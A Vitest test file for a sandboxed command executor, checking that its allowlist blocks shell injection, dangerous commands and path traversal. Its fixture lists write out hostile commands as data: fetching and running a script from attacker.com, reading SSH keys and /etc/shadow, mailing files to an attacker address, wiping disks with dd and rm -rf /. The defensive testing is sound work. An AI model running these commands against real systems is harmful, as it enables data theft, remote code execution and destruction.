/**
 * Sandbox Execution Tests
 *
 * Security-critical tests for sandbox-exec.ts which provides
 * sandbox-aware command execution for CLI commands.
 *
 * @module cli/__tests__/sandbox-exec.test
 * (Source: Issue #345)
 */

import { describe, it, expect } from 'vitest';
import {
  validateCommandWithPolicy,
  safeExecSandboxed,
  execSandboxed,
  isCommandAllowed,
  type ExecContext,
} from '../sandbox-exec.js';
import { DEVELOPMENT_POLICY, RESTRICTIVE_POLICY } from '../../security/sandbox/index.js';

/** Command injection attack vectors. */
const INJECTION_ATTACKS = [
  // Command chaining
  'echo hello; rm -rf /',
  'ls && cat /etc/passwd',
  'pwd || wget malicious.com',
  // Command substitution
  'echo $(whoami)',
  'ls `id`',
  'cat ${HOME}/.ssh/id_rsa',
  // Subshell execution
  'echo $(cat /etc/shadow)',
  '$(curl attacker.com/shell.sh | bash)',
  // Redirection attacks
  'echo "malicious" > /etc/hosts',
  'cat < /etc/passwd',
  'ls >> /tmp/exfil',
  // Background execution
  'sleep 10 &',
  'nc -l 4444 &',
  // Here-doc injection
  'cat <<< "inject"',
] as const;

/** Explicitly denied dangerous commands. */
const DANGEROUS_COMMANDS = [
  'rm',
  'rm -rf /',
  'sudo rm -rf /',
  'curl http://malicious.com',
  'wget https://attacker.com/payload',
  'nc -l 1234',
  'ssh root@victim',
  'chmod 777 /',
  'chown root:root /etc/passwd',
  'dd if=/dev/zero of=/dev/sda',
  'mount /dev/sda1 /mnt',
  'kill -9 1',
  'reboot',
  'shutdown -h now',
] as const;

/** Path traversal attempts. */
const PATH_TRAVERSAL_ATTACKS = [
  './malicious-script.sh',
  '../../../bin/bash',
  '/usr/local/bin/python3',
  '\\windows\\system32\\cmd.exe',
] as const;

// =============================================================================
// Input Validation Tests
// =============================================================================

describe('Sandbox Exec - Input Validation', () => {
  describe('validateCommandWithPolicy', () => {
    it('should accept empty options (uses defaults)', () => {
      const result = validateCommandWithPolicy('ls');
      expect(result).toBeNull();
    });

    it('should handle empty command string', () => {
      const result = validateCommandWithPolicy('');
      // Empty command should be rejected (not in allowlist)
      expect(result).not.toBeNull();
    });

    it('should handle whitespace-only command', () => {
      const result = validateCommandWithPolicy('   ');
      expect(result).not.toBeNull();
    });

    it('should handle undefined context gracefully', () => {
      const result = validateCommandWithPolicy('ls', {});
      expect(result).toBeNull();
    });

    it('should accept valid context values', () => {
      const contexts: ExecContext[] = ['read', 'write', 'git', 'gh'];
      for (const context of contexts) {
        const result = validateCommandWithPolicy('ls', { context });
        expect(result).toBeNull();
      }
    });
  });

  describe('Command Parsing', () => {
    it('should correctly parse command with no arguments', () => {
      const result = validateCommandWithPolicy('ls');
      expect(result).toBeNull();
    });

    it('should correctly parse command with single argument', () => {
      const result = validateCommandWithPolicy('ls -la');
      expect(result).toBeNull();
    });

    it('should correctly parse command with multiple arguments', () => {
      const result = validateCommandWithPolicy('ls -la /tmp');
      expect(result).toBeNull();
    });

    it('should handle double-quoted arguments', () => {
      const result = validateCommandWithPolicy('echo "hello world"');
      expect(result).toBeNull();
    });

    it('should handle single-quoted arguments', () => {
      const result = validateCommandWithPolicy("echo 'hello world'");
      expect(result).toBeNull();
    });

    it('should handle mixed quotes', () => {
      const result = validateCommandWithPolicy('echo "it\'s working"');
      expect(result).toBeNull();
    });

    it('should handle arguments with equals signs', () => {
      const result = validateCommandWithPolicy('git config --global user.name="Test"');
      expect(result).toBeNull();
    });
  });
});

// =============================================================================
// Command Allowlist Tests
// =============================================================================

describe('Sandbox Exec - Command Allowlist', () => {
  describe('Allowed Commands', () => {
    it('should allow shell utility commands', () => {
      const shellUtils = ['ls', 'cat', 'echo', 'pwd', 'which', 'date', 'env'];
      for (const cmd of shellUtils) {
        const result = validateCommandWithPolicy(cmd);
        expect(result).toBeNull();
      }
    });

    it('should allow package manager commands', () => {
      const pkgManagers = ['npm', 'pnpm', 'yarn', 'npx'];
      for (const cmd of pkgManagers) {
        const result = validateCommandWithPolicy(cmd, { context: 'write' });
        expect(result).toBeNull();
      }
    });

    it('should allow version control commands', () => {
      const result = validateCommandWithPolicy('git status', { context: 'git' });
      expect(result).toBeNull();
    });

    it('should allow GitHub CLI commands', () => {
      const result = validateCommandWithPolicy('gh issue list', { context: 'gh' });
      expect(result).toBeNull();
    });

    it('should allow Node.js runtime', () => {
      const result = validateCommandWithPolicy('node --version', { context: 'write' });
      expect(result).toBeNull();
    });

    it('should allow build tools', () => {
      const buildTools = ['tsc', 'vitest'];
      for (const cmd of buildTools) {
        const result = validateCommandWithPolicy(cmd, { context: 'write' });
        expect(result).toBeNull();
      }
    });
  });

  describe('Denied Commands', () => {
    for (const cmd of DANGEROUS_COMMANDS) {
      it(`should deny dangerous command: ${cmd}`, () => {
        const result = validateCommandWithPolicy(cmd);
        expect(result).not.toBeNull();
        expect(result?.type).toBe('command');
      });
    }
  });
});

// =============================================================================
// Command Injection Prevention
// =============================================================================

describe('Sandbox Exec - Command Injection Prevention', () => {
  for (const attack of INJECTION_ATTACKS) {
    it(`should block injection attack: ${attack.slice(0, 40)}...`, () => {
      const result = validateCommandWithPolicy(attack);
      expect(result).not.toBeNull();
    });
  }

  describe('Specific Injection Patterns', () => {
    it('should block semicolon command chaining', () => {
      const result = validateCommandWithPolicy('echo hello; whoami');
      expect(result).not.toBeNull();
      expect(result?.reason).toContain('denied pattern');
    });

    it('should block pipe operators', () => {
      const result = validateCommandWithPolicy('cat /etc/passwd | grep root');
      expect(result).not.toBeNull();
    });

    it('should block AND operator', () => {
      const result = validateCommandWithPolicy('true && rm -rf /');
      expect(result).not.toBeNull();
    });

    it('should block OR operator', () => {
      const result = validateCommandWithPolicy('false || malicious');
      expect(result).not.toBeNull();
    });

    it('should block backtick substitution', () => {
      const result = validateCommandWithPolicy('echo `id`');
      expect(result).not.toBeNull();
    });

    it('should block $() substitution', () => {
      const result = validateCommandWithPolicy('echo $(whoami)');
      expect(result).not.toBeNull();
    });

    it('should block ${} variable expansion', () => {
      const result = validateCommandWithPolicy('echo ${PATH}');
      expect(result).not.toBeNull();
    });

    it('should block output redirection (>)', () => {
      const result = validateCommandWithPolicy('echo evil > /etc/passwd');
      expect(result).not.toBeNull();
    });

    it('should block input redirection (<)', () => {
      const result = validateCommandWithPolicy('mail attacker@evil.com < /etc/shadow');
      expect(result).not.toBeNull();
    });

    it('should block append redirection (>>)', () => {
      const result = validateCommandWithPolicy('echo "malicious" >> ~/.bashrc');
      expect(result).not.toBeNull();
    });

    it('should block background execution (&)', () => {
      const result = validateCommandWithPolicy('reverse-shell.sh &');
      expect(result).not.toBeNull();
    });
  });
});

// =============================================================================
// Path Traversal Prevention
// =============================================================================

describe('Sandbox Exec - Path Traversal Prevention', () => {
  for (const path of PATH_TRAVERSAL_ATTACKS) {
    it(`should block path traversal: ${path}`, () => {
      const result = validateCommandWithPolicy(path);
      expect(result).not.toBeNull();
      // Path traversal should be blocked (may mention 'path' or 'separator')
      expect(result?.reason.toLowerCase()).toMatch(/path|separator/);
    });
  }

  it('should block absolute paths to binaries', () => {
    const result = validateCommandWithPolicy('/bin/bash');
    expect(result).not.toBeNull();
  });

  it('should block relative paths with dot-dot', () => {
    const result = validateCommandWithPolicy('../../../bin/sh');
    expect(result).not.toBeNull();
  });

  it('should block Windows-style paths', () => {
    const result = validateCommandWithPolicy('C:\\Windows\\System32\\cmd.exe');
    expect(result).not.toBeNull();
  });

  it('should block denied commands even with path prefix', () => {
    // /bin/rm should be blocked both for path and for being rm
    const result = validateCommandWithPolicy('/bin/rm');
    expect(result).not.toBeNull();
  });
});

// =============================================================================
// Policy Selection Tests
// =============================================================================

describe('Sandbox Exec - Policy Selection', () => {
  describe('Context-based Policy Selection', () => {
    it('should use READONLY_POLICY for read context', () => {
      // READONLY is more restrictive, npm might not be allowed
      const result = validateCommandWithPolicy('ls', { context: 'read' });
      expect(result).toBeNull();
    });

    it('should use DEVELOPMENT_POLICY for write context', () => {
      const result = validateCommandWithPolicy('npm install', { context: 'write' });
      expect(result).toBeNull();
    });

    it('should use DEVELOPMENT_POLICY for git context', () => {
      const result = validateCommandWithPolicy('git push', { context: 'git' });
      expect(result).toBeNull();
    });

    it('should use DEVELOPMENT_POLICY for gh context', () => {
      const result = validateCommandWithPolicy('gh pr create', { context: 'gh' });
      expect(result).toBeNull();
    });

    it('should default to READONLY_POLICY when no context', () => {
      // Default should be restrictive
      const result = validateCommandWithPolicy('ls', {});
      expect(result).toBeNull();
    });
  });

  describe('Custom Policy Override', () => {
    it('should use custom policy when provided', () => {
      const customPolicy = {
        ...RESTRICTIVE_POLICY,
        allowedCommands: ['custom-cmd'],
      };
      const result = validateCommandWithPolicy('custom-cmd', { policy: customPolicy });
      expect(result).toBeNull();
    });

    it('should reject command not in custom policy', () => {
      const customPolicy = {
        ...RESTRICTIVE_POLICY,
        allowedCommands: ['only-this'],
      };
      const result = validateCommandWithPolicy('ls', { policy: customPolicy });
      expect(result).not.toBeNull();
    });

    it('should still deny explicitly dangerous commands even with custom policy', () => {
      const permissivePolicy = {
        ...DEVELOPMENT_POLICY,
        allowedCommands: [...DEVELOPMENT_POLICY.allowedCommands, 'rm'],
      };
      // rm is in DENIED_COMMANDS, should still be blocked
      const result = validateCommandWithPolicy('rm', { policy: permissivePolicy });
      expect(result).not.toBeNull();
      expect(result?.reason).toContain('explicitly denied');
    });
  });
});

// =============================================================================
// Safe Execution Tests
// =============================================================================

describe('Sandbox Exec - Safe Execution', () => {
  describe('safeExecSandboxed', () => {
    it('should return null for denied commands (not throw)', () => {
      const result = safeExecSandboxed('rm -rf /');
      expect(result).toBeNull();
    });

    it('should execute allowed commands', () => {
      const result = safeExecSandboxed('echo hello');
      expect(result).toBe('hello');
    });

    it('should return trimmed output', () => {
      const result = safeExecSandboxed('echo "  spaced  "');
      expect(result).toBe('spaced');
    });

    it('should return null on command failure', () => {
      const result = safeExecSandboxed('ls /nonexistent-directory-12345');
      expect(result).toBeNull();
    });

    it('should respect cwd option', () => {
      const result = safeExecSandboxed('pwd', { cwd: '/tmp' });
      expect(result).toBe('/tmp');
    });
  });

  describe('execSandboxed', () => {
    it('should throw for denied commands', () => {
      expect(() => execSandboxed('rm -rf /')).toThrow('Sandbox policy denied');
    });

    it('should execute allowed commands', () => {
      const result = execSandboxed('echo hello');
      expect(result).toBe('hello');
    });

    it('should throw on command failure', () => {
      expect(() => execSandboxed('ls /nonexistent-directory-12345')).toThrow();
    });

    it('should include denial reason in error message', () => {
      expect(() => execSandboxed('rm test')).toThrow(/explicitly denied/);
    });
  });

  describe('isCommandAllowed', () => {
    it('should return true for allowed commands', () => {
      expect(isCommandAllowed('ls')).toBe(true);
      expect(isCommandAllowed('echo hello')).toBe(true);
      expect(isCommandAllowed('pwd')).toBe(true);
    });

    it('should return false for denied commands', () => {
      expect(isCommandAllowed('rm -rf /')).toBe(false);
      expect(isCommandAllowed('curl http://evil.com')).toBe(false);
      expect(isCommandAllowed('sudo anything')).toBe(false);
    });

    it('should return false for injection attempts', () => {
      expect(isCommandAllowed('ls; rm -rf /')).toBe(false);
      expect(isCommandAllowed('echo $(whoami)')).toBe(false);
    });
  });
});

// =============================================================================
// Edge Cases and Boundary Conditions
// =============================================================================

describe('Sandbox Exec - Edge Cases', () => {
  describe('Unicode and Special Characters', () => {
    it('should handle unicode in arguments', () => {
      const result = validateCommandWithPolicy('echo "Hello"');
      expect(result).toBeNull();
    });

    it('should handle emojis in arguments', () => {
      const result = safeExecSandboxed('echo "test"');
      expect(result).toBe('test');
    });
  });

  describe('Argument Edge Cases', () => {
    it('should handle empty quoted strings', () => {
      const result = validateCommandWithPolicy('echo ""');
      expect(result).toBeNull();
    });

    it('should handle multiple spaces between arguments', () => {
      const result = validateCommandWithPolicy('ls    -la');
      expect(result).toBeNull();
    });

    it('should handle very long arguments', () => {
      const longArg = 'a'.repeat(10000);
      const result = validateCommandWithPolicy(`echo "${longArg}"`);
      expect(result).toBeNull();
    });
  });

  describe('Command Name Normalization', () => {
    it('should handle command with .exe extension in write context', () => {
      // Use write context which includes node in allowlist
      const result = validateCommandWithPolicy('node.exe', { context: 'write' });
      // Should normalize to 'node' and check against allowlist
      expect(result).toBeNull();
    });

    it('should handle command with .sh extension', () => {
      // ./script.sh contains path separator, should be blocked
      const result = validateCommandWithPolicy('./script.sh');
      expect(result).not.toBeNull();
    });

    it('should normalize .exe extensions correctly', () => {
      // tsc.exe should normalize to tsc which is in the build tools
      const result = validateCommandWithPolicy('tsc.exe', { context: 'write' });
      expect(result).toBeNull();
    });
  });
});

// =============================================================================
// Security Regression Tests
// =============================================================================

describe('Sandbox Exec - Security Regressions', () => {
  it('should always block rm regardless of context', () => {
    const contexts: ExecContext[] = ['read', 'write', 'git', 'gh'];
    for (const context of contexts) {
      const result = validateCommandWithPolicy('rm file.txt', { context });
      expect(result).not.toBeNull();
    }
  });

  it('should always block sudo regardless of context', () => {
    const contexts: ExecContext[] = ['read', 'write', 'git', 'gh'];
    for (const context of contexts) {
      const result = validateCommandWithPolicy('sudo ls', { context });
      expect(result).not.toBeNull();
    }
  });

  it('should always block curl regardless of arguments', () => {
    expect(validateCommandWithPolicy('curl localhost')).not.toBeNull();
    expect(validateCommandWithPolicy('curl --help')).not.toBeNull();
  });

  it('should always block wget regardless of arguments', () => {
    expect(validateCommandWithPolicy('wget localhost')).not.toBeNull();
    expect(validateCommandWithPolicy('wget --version')).not.toBeNull();
  });

  it('should block shell built-ins used for escape', () => {
    // These are often used in container/sandbox escape attempts
    const escapeCommands = ['bash', 'sh', 'zsh', 'csh', 'tcsh', 'fish'];
    for (const shell of escapeCommands) {
      const result = validateCommandWithPolicy(shell);
      // Shells should not be in allowlist
      expect(result).not.toBeNull();
    }
  });
});
